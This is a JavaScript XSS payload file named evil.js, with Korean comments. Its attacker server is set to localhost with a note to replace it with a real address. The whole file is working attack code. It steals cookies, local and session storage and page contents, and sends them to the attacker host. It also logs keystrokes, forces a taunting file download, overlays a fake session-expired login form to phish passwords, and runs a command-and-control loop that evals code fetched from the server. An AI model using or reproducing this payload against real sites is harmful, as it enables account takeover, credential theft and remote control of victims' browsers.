// evil.js - 모든 XSS 공격 기능 포함
(function() {
    // 공격 서버 주소 (수정 필요!)
    const ATTACKER_SERVER = 'http://localhost:5000';  // 여기를 실제 서버 주소로 변경
    
    // 1. 쿠키 탈취
    console.log('[*] Stealing cookies...');
    new Image().src = ATTACKER_SERVER + '/steal?c=' + encodeURIComponent(document.cookie);
    
    // 2. 세션 정보 수집
    const sessionData = {
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        url: window.location.href,
        userAgent: navigator.userAgent
    };
    
    fetch(ATTACKER_SERVER + '/session', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(sessionData),
        mode: 'no-cors'
    });
    
    // 3. 키로거 설치
    console.log('[*] Installing keylogger...');
    let keyBuffer = '';
    document.addEventListener('keypress', function(e) {
        keyBuffer += e.key;
        if (keyBuffer.length >= 10) {
            new Image().src = ATTACKER_SERVER + '/keylog?k=' + btoa(keyBuffer);
            keyBuffer = '';
        }
    });
    
    // 4. 파일 자동 다운로드
    setTimeout(function() {
        console.log('[*] Downloading file...');
        const content = "이 컴퓨터는 이제 제 껍니다. 제 마음대로 할 수 있는 겁니다.";
        const blob = new Blob([content], {type: 'text/plain;charset=utf-8'});
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.style.display = 'none';
        a.href = url;
        a.download = '리버스 쉘이라면.txt';
        document.body.appendChild(a);
        a.click();
        window.URL.revokeObjectURL(url);
        document.body.removeChild(a);
    }, 2000);
    
    // 5. 피싱 폼 삽입
    setTimeout(function() {
        console.log('[*] Injecting phishing form...');
        const phishingDiv = document.createElement('div');
        phishingDiv.id = 'phishing-form';
        phishingDiv.innerHTML = `
            <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:99999;">
                <div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background:white;padding:30px;border-radius:10px;box-shadow:0 0 20px rgba(0,0,0,0.5);">
                    <h2 style="color:#333;margin-bottom:20px;">세션이 만료되었습니다</h2>
                    <p style="color:#666;margin-bottom:15px;">보안을 위해 다시 로그인해주세요</p>
                    <input type="password" id="phish-pwd" placeholder="비밀번호" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ddd;border-radius:5px;">
                    <button onclick="window.stealPassword()" style="width:100%;padding:10px;background:#4CAF50;color:white;border:none;border-radius:5px;cursor:pointer;">로그인</button>
                </div>
            </div>
        `;
        document.body.appendChild(phishingDiv);
        
        // 비밀번호 훔치기 함수
        window.stealPassword = function() {
            const pwd = document.getElementById('phish-pwd').value;
            new Image().src = ATTACKER_SERVER + '/phish?p=' + encodeURIComponent(pwd);
            document.getElementById('phishing-form').remove();
            alert('로그인되었습니다!');
        };
    }, 5000);
    
    // 6. BeEF 스타일 훅 (브라우저 제어)
    console.log('[*] Establishing command & control...');
    setInterval(function() {
        fetch(ATTACKER_SERVER + '/command')
            .then(response => response.text())
            .then(command => {
                if (command && command.trim() !== '') {
                    try {
                        eval(command);
                    } catch(e) {
                        console.error('Command execution failed:', e);
                    }
                }
            })
            .catch(() => {});
    }, 5000);
    
    // 7. 스크린샷 시뮬레이션 (페이지 정보 수집)
    setTimeout(function() {
        const pageInfo = {
            title: document.title,
            html: document.documentElement.innerHTML.substring(0, 5000),
            forms: Array.from(document.forms).map(f => ({
                action: f.action,
                method: f.method,
                inputs: Array.from(f.elements).map(e => ({name: e.name, type: e.type}))
            }))
        };
        
        fetch(ATTACKER_SERVER + '/screenshot', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(pageInfo),
            mode: 'no-cors'
        });
    }, 3000);
    
    console.log('[+] XSS payload fully loaded!');
})();